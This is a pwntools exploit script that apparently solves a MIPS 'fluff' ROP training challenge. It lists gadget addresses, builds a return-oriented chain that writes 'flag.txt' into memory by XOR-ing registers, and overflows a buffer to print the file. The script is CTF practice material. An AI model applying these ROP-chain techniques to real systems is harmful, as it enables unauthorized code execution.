from pwn import *
#io = process("qemu-mipsel -g 1024 -L /usr/mipsel-linux-gnu fluff_mipsel",shell=True)
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu fluff_mipsel",shell=True)

"""
 0x0040099c      0400b98f       lw t9, 4(sp)
 0x004009a0      000011ae       sw s1, (s0)
 0x004009a4      09f82003       jalr t9
 0x004009a8      0800bd23       addi sp, sp, 8
"""
write_s1_s0_gadget = 0x0040099c

"""
 0x004009ac      0800a48f       lw a0, 8(sp)
 0x004009b0      0400b98f       lw t9, 4(sp)
 0x004009b4      09f82003       jalr t9
 0x004009b8      0c00bd23       addi sp, sp, 0xc
"""
load_a0_gadget = 0x004009ac

"""
 0x0040094c      0800b98f       lw t9, 8(sp)
 0x00400950      0400b28f       lw s2, 4(sp)
 0x00400954      41000c3c       lui t4, 0x41                ; 'A'
 0x00400958      742c8c35       ori t4, t4, 0x2c74
 0x0040095c      09f82003       jalr t9
 0x00400960      0c00bd23       addi sp, sp, 0xc
"""
load_s2_gadget = 0x0040094c

"""
 0x00400964      0400b98f       lw t9, 4(sp)
 0x00400968      26883202       xor s1, s1, s2
 0x0040096c      4100053c       lui a1, 0x41                ; 'A'
 0x00400970      0015a534       ori a1, a1, 0x1500
 0x00400974      09f82003       jalr t9
 0x00400978      0800bd23       addi sp, sp, 8
"""
xor_s1_s2_gadget = 0x00400964

"""
 0x00400930      0800b98f       lw t9, 8(sp)
 0x00400934      0400ac8f       lw t4, 4(sp)
 0x00400938      26883102       xor s1, s1, s1
 0x0040093c      4100043c       lui a0, 0x41                ; 'A'
 0x00400940      702c8434       ori a0, a0, 0x2c70
 0x00400944      09f82003       jalr t9
 0x00400948      0c00bd23       addi sp, sp, 0xc
"""
zero_s1_gadget = 0x00400930 

"""
 0x0040097c      0400b98f       lw t9, 4(sp)
 0x00400980      26801102       xor s0, s0, s1
 0x00400984      26881102       xor s1, s0, s1
 0x00400988      26801102       xor s0, s0, s1
 0x0040098c      41000d3c       lui t5, 0x41                ; 'A'
 0x00400990      0415ad35       ori t5, t5, 0x1504
 0x00400994      09f82003       jalr t9
"""
load_s0_gadget = 0x0040097c

def write(data, address):
    l = len(data)
    if l % 4 != 0:
        data.extend([b"\x00"] * (4 - (l % 4)))

    chain = b""
    for i in range(0,l,4):
        # $s1 = 0
        chain += p32(zero_s1_gadget)
        chain += p32(0)
        chain += p32(0)
        # $s2 = address
        chain += p32(load_s2_gadget)
        chain += p32(0)
        chain += p32(address + i)
        # $s1 = 0 ^ $s2 = $s2 = address
        chain += p32(xor_s1_s2_gadget)
        chain += p32(0)
        # $s0 = $s1 = address
        chain += p32(load_s0_gadget)
        chain += p32(0)
        # $s1 = 0
        chain += p32(zero_s1_gadget)
        chain += p32(0)
        chain += p32(0)
        # $s2 = data_chunk
        chain += p32(load_s2_gadget)
        chain += p32(0)
        chain += data[i:i+4]
        # $s1 = 0 ^ $s2 = $s2 = data chunk
        chain += p32(xor_s1_s2_gadget)
        chain += p32(0)
        # copy data chunk to address
        chain += p32(write_s1_s0_gadget)
        chain += p32(0)
    return chain

payload = b""
payload += b"A"*36
payload += write(b"flag.txt",0x00411068)
payload += p32(load_a0_gadget) + p32(0) + p32(0x00400af0) + p32(0x00411068)

io.send(payload)
io.interactive()
